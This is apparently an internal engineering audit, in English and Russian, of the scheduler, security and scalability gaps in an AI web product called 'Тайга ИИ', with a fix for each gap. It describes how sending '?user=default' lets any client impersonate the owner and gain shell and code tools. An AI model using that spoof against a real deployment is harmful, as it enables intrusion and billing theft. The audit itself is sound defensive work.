- **ONE reliable scheduler (single engine)** — `partial` [med]
  - разрыв: Duplicated clock/dedup/observability logic, two file stores, two rate-limit philosophies (routines: 8/hr/user; jobs: min-interval 600s). More surface to drift and double-maintain; no unified 'is the scheduler alive' signal across both.
  - фикс: Long-term, fold the per-user routine engine onto scheduler.py's compute_next_run + tick loop (routines already map cleanly to kind='time'/'interval'). Short-term, at minimum export a shared heartbeat (last-tick timestamp) from BOTH loops and surface it; keep one rate-limit model.
- **Weekly trigger correctness** — `wrong` [med]
  - разрыв: A user who creates a weekly routine on a Thursday reasonably expects it Thursdays; it silently only ever runs Mondays. Misleading vs the UI label 'еженедельно'.
  - фикс: Store a target weekday on the routine (default = createdTs weekday or a UI day-picker) and compare wd against it instead of the hardcoded 0. Migrate existing weekly routines to their createdTs weekday.
- **Idempotent jobs (no double-fire)** — `partial` [med]
  - разрыв: Idempotency relies on single-instance + sub-60s LLM latency. A slow LLM run (1200 tokens can exceed 60s) lets the next tick re-evaluate the same routine as still-due before lastRunTs is written, risking a duplicate paid run.
  - фикс: Reserve the slot before the LLM call: write a provisional lastRunTs/running-record under the lock at the START of _routine_execute, then update status on completion. This closes the overlap window and makes runs truly once-per-window.
- **Balance gating / anti-runaway cost** — `meets` [med]
  - разрыв: Routine LLM runs (_routine_run_prompt via venice_complete, server.py:14377) are NOT metered/charged at all — they bypass charge_media, unlike _scheduled_runner. Owner-only by default mitigates, but with MOSTIK_ROUTINES_ALL=1 every user gets up to 8 free LLM runs/hr off the owner's keys.
  - фикс: Meter _routine_run_prompt output through the normal billing path (or charge a flat per-run fee like scheduled jobs $0.05) before opening MOSTIK_ROUTINES_ALL to all users.
- **Observability (liveness, run history, failures)** — `partial` [med]
  - разрыв: If either background thread dies silently (the bare except in scheduler.py _loop swallows everything, scheduler.py:266-268), nothing detects it — /sprint check #5 only inspects scheduler.py's _RUNNER being non-None, which stays wired even if the thread is dead. No alerting on repeated routine failur
  - фикс: Add a module-level last_tick_ts updated each loop iteration in BOTH _start_routine_scheduler and scheduler._loop; expose via /api/jobs/health or extend /sprint check #5 to assert (now - last_tick) < 2*interval for both engines, not just _RUNNER presence. Count consecutive failures per routine and fl
- **Scheduled orchestration jobs (/api/jobs cron)** — `meets` [med]
  - разрыв: add_job/list/delete/toggle in api_jobs have NO owner-gate — any uid in the request body can create/list their own jobs. Combined with _scheduled_runner's per-uid balance gate this is contained for execution, but listing/creating is not access-controlled and uid is taken straight from the request bod
  - фикс: Resolve caller from the verified session token (resolve_caller) instead of trusting c.get('user'), and apply the same is_owner/_ip_guard gating used elsewhere before allowing job add.
- **Triggers that actually fire (time-based)** — `meets` [low]
  - разрыв: scheduler.py time jobs use server-local tz only (no per-job tz), unlike routines which support per-routine tz — minor inconsistency.
  - фикс: Optionally add a tz field to scheduler.py time jobs for parity; not blocking.
- **Sleep-time internal maintenance jobs** — `meets` [low]
  - разрыв: Internal jobs share the same 60s loop; if _tick (paid jobs) raises before _tick_internal, _tick_internal still runs (separate try/except in scheduler._loop:265-272) — fine. Minor: internal job last_run/last_result kept only in memory, lost on restart.
  - фикс: Optional: persist internal job state if restart-survival of last-run matters; currently acceptable since it self-reschedules on boot.
  - **главные разрывы:** Event routines (on_run_done / on_chat_match) are a fully dead path: the handler and matcher are correct but NOTHING ever calls _routine_fire_event / POSTs /api/routine_event (0 hits in taiga-web/src), so every enabled event-automation in the UI is an orphan promise that can never fire. Fix: call _routine_fire_event internally at agent run-completion (next to emit('done') server.py:10831) and on each chat message, or hide the triggers in the UI until wired.; Two parallel scheduler engines (per-user routines loop server.py:14494 + scheduler.py loop server.py:14720) with no shared liveness/heartbeat and only stdout prints for failures; /sprint liveness check only inspects scheduler._RUNNER being non-None, which stays True even if the thread has died. Add a last-tick heartbeat to both and assert freshness in /sprint.; Weekly trigger is hardcoded to Mondays (server.py:14329 'wd != 0'), so a weekly routine never runs on the day the user intended. Store a target weekday and compare against it.

### Тайга ИИ — оценка D
- **Application server / request runtime** — `wrong` [critical]
  - разрыв: One process + GIL caps real concurrency at roughly one CPU core regardless of thread count; long SSE streams and ffmpeg/base64 work pin threads. No TLS, no LB, no process-level isolation. A single slow/crashing request handler degrades everyone. This is a single-node-localhost MVP, not a 10k-user se
  - фикс: Wrap handlers in ASGI (Starlette) or port routes to FastAPI; run uvicorn/gunicorn with multiple workers; put nginx/Caddy in front for TLS + buffering; deploy 2+ nodes behind a load balancer. The team's own SCALE-PLAN.md Phase 2 describes exactly this and admits 'GIL душит на 10k'.
- **Database (Postgres vs single SQLite)** — `wrong` [critical]
  - разрыв: SQLite is single-writer; every write is funneled through one Python lock on one connection — a hard serialization point that 10k concurrent chat/memory/billing writes will bottleneck and stall. JSON-blob-in-a-row stores rewrite the whole document per update (read-modify-write races, no partial index
  - фикс: Migrate to managed Postgres with a psycopg pool (SCALE-PLAN Phase 1); normalize the JSON-blob tables into real columns/rows; move RAG vectors to pgvector + HNSW. Keep the `_db()` seam — it is the right abstraction point, but it must become a pool, not one mutexed connection.
- **Object storage for media (images / video / audio)** — `missing` [critical]
  - разрыв: Base64 inflates payloads ~33% and forces multi-MB (video: tens of MB) responses to be buffered fully in the single server process and re-encoded into JSON — huge memory + GIL pressure, no CDN, no caching, no resumable downloads. Local-disk storage is not shared across nodes and not durable, so horiz
  - фикс: Write all generated media to S3/R2; return presigned CDN URLs from the API; stream uploads/downloads instead of base64-in-JSON; keep per-user encryption but with the ciphertext in object storage keyed by uid.
- **AuthN/AuthZ & multi-tenant isolation (owner / billing)** — `wrong` [critical]
  - разрыв: This is REBUILD-BRIEF mine #0: any client can send `?user=default` (or any owner uid) and become the untaxed owner with admin + code-execution tools — a spoofable-owner RCE and total billing/tenant-isolation bypass. The good auth code is bypassed on nearly every endpoint. CLAUDE.md explicitly warns 
  - фикс: Add a single `resolve_caller()` that derives uid (and owner flag) ONLY from `auth.uid_from_token`/cookie on EVERY endpoint; ignore body/query `user` for authz; gate owner tools on the verified flag. This must land before any public exposure.
- **Backups & disaster recovery** — `missing` [critical]
  - разрыв: A disk failure, bad migration, or `rm` loses every user, balance, chat, memory, and encryption key with no recovery. No off-host copy, no PITR, no restore test. Catastrophic for a paid product holding user wallets.
  - фикс: On Postgres: enable PITR / nightly logical dumps to object storage with retention; for the interim SQLite, run `VACUUM INTO`/`.backup` to off-host storage on a cron; store media in versioned object storage; write and TEST a restore runbook.
- **Secrets management** — `wrong` [high]
  - разрыв: Every secret, including the single master key protecting all per-user encrypted data, sits in plaintext on one Mac's home directory. No rotation, no central revocation, no audit. If that disk/backup leaks, every user's BYOK keys and cookies decrypt. Co-locating the master key with the ciphertext it 
  - фикс: Move provider keys + Fernet data key + auth secret into a secrets manager / KMS; load at boot into memory only; rotate; never persist the data key next to the data. For BYOK, consider envelope encryption with a KMS-held root key.
- **Observability (logs / metrics / tracing)** — `partial` [high]
  - разрыв: Logs go to one local file with no aggregation, search, or retention; no numeric metrics (latency percentiles, error rate, queue depth, $ spend) to alert on; no distributed tracing across the model-fanout/agent paths; provider health resets on restart and is per-process. At 10k users you would be bli
  - фикс: Emit metrics via OTel/Prometheus client and scrape them; ship structured logs to Loki/ELK/Datadog; add Sentry for exceptions; build latency/error/cost dashboards with alerts. Keep the existing log_request line but make it JSON and shipped, not stderr-to-file.
- **Health checks / readiness probes** — `missing` [high]
  - разрыв: A load balancer or container orchestrator has nothing cheap to probe; a wedged process keeps receiving traffic. No way to gate rollouts on readiness or auto-restart on unhealthy.
  - фикс: Add unauthenticated `/healthz` (process up) and `/readyz` (DB SELECT 1 + key files present) returning 200/503; wire them into the LB health check and orchestrator liveness/readiness probes.
- **Horizontal scalability (shared state)** — `wrong` [high]
  - разрыв: You cannot run a second node: rate limits and abuse counters would be per-node (bypassable by spreading load), the per-uid balance lock would not prevent cross-node double-spend, and agent approval gates (`_AGENT_PERMITS`) and in-flight agent runs are pinned to the process that started them. The arc
  - фикс: Externalize coordination state to Redis (rate limits, agent permits/answers, distributed per-uid balance lock) and the DB (everything durable); make nodes stateless so the LB can fan out. SCALE-PLAN Phase 2 step 4 captures this.
- **Deployment / process supervision / auto-update** — `partial` [high]
  - разрыв: Production on a single consumer Mac via launchd: no reproducible build, unpinned deps (can't recreate the environment), no health-gated restart/rollback, and a co-located MLX sidecar that ties the app to that one machine. Home-IP/residential hosting, single point of failure.
  - фикс: Containerize with a pinned lockfile; run under a real supervisor/orchestrator (systemd/k8s) on server-grade hosts; gate restarts on /readyz; make the MLX/embedding sidecar an independently scaled service (SCALE-PLAN Phase 4).
- **Graceful shutdown** — `missing` [med]
  - разрыв: launchd/orchestrator stop or deploy sends SIGTERM → the process is hard-killed mid-request; in-flight chats and SSE streams are severed, balance/DB writes can be interrupted (mitigated by SQLite transactional atomicity but WAL not checkpointed), and rolling deploys cause user-visible errors.
  - фикс: Install a SIGTERM/SIGINT handler that calls `srv.shutdown()` from a side thread, waits for active handlers up to a drain deadline, runs a final WAL checkpoint, and closes the connection. Required for zero-downtime deploys behind a LB.
  - **главные разрывы:** Spoofable identity = owner-RCE + billing bypass: nearly all endpoints take the caller from `?user=` query string (server.py:11608 etc.) and is_owner() trusts it (server.py:7009); the real signed-token auth (auth.py) is enforced in only 2 places. Anyone can become the untaxed owner with shell/run_code/file tools. (REBUILD-BRIEF mine #0 — must fix before any public exposure.); Single GIL-bound stdlib ThreadingHTTPServer bound to 127.0.0.1 with one SQLite file behind one process-wide write mutex (server.py:14755, 7044/7031): cannot serve 10k concurrent users; needs ASGI+gunicorn workers + multiple nodes + managed Postgres (SCALE-PLAN Phases 1-2).; No backups and no object storage: user wallets/chats/keys live only on one Mac's local disk with no off-host copy or restore path, and all media is shipped as multi-MB base64 inside JSON (server.py:3306/9993/10324) instead of S3/CDN URLs.

